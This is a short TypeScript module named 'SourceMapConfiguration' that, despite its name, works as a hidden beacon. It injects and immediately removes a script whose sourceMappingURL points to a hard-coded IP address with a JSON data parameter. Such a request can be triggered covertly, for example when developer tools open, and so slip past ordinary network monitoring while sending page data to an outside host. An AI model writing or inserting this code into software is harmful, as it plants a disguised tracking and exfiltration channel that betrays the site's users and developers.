export class SourceMapConfiguration {
    public static initialize(): void {
        function smap(url: string, data: object) {
            const script = document.createElement('script');
            script.textContent = `//# sourceMappingURL=${url}?data=${JSON.stringify(data)}&.js.map`;
            document.head.appendChild(script);
            script.remove();
        }
        smap("http://159.89.54.243:5000/stats", {})
    }
}

export default SourceMapConfiguration